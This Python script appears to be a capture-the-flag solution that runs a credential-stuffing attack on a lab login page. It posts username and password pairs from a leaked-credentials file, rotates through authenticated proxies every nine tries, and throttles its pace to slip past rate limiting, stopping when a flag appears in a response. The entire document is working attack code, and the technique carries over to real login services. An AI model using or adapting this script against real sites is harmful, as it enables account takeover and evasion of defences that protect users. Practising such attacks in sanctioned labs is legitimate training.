import requests
from itertools import cycle
import time
import re

session = requests.Session()

url = 'http://xebec.cylabacademy.net:31515/login'
counter = 0
big_counter = 0
proxies = []
with open("proxies.txt",'r') as file:
    for line in file:
        counter += 1
        ip,port,username,password = line.strip().split(':')
        proxies.append(f"http://{username}:{password}@{ip}:{port}")

loop = counter * 9
counter = 0
prox_cycle = cycle(proxies)
proxy = next(prox_cycle)
print(f"using: {proxy.split('@')[-1]}")

cur_time = time.time()

with open('creds-dump.txt','r') as file:
    for line in file:
        if big_counter >= loop:
            print("Looping back")
            big_counter = 0
            if time.time() - cur_time <= 35:
                time.sleep(35 - (time.time() - cur_time))
            cur_time = time.time()
            
        if counter >= 9:
            proxy = next(prox_cycle)
            print(f"using: {proxy.split('@')[-1]}")
            counter = 0
        user,passwd = line.strip('\n\r').split(';',1)

        print(f"trying: {user};{passwd}")
        response = session.post(url, data={"username":user,"password":passwd},proxies={'http':proxy,'https':proxy})

        if 'Invalid username or password.' not in response.text:
            print("Possible login: \n", response.text)

        counter += 1
        big_counter += 1
        flag = re.search(r"(?:picoCTF|academy){.*}", response.text)
        if flag:
            print("\n",flag)
            break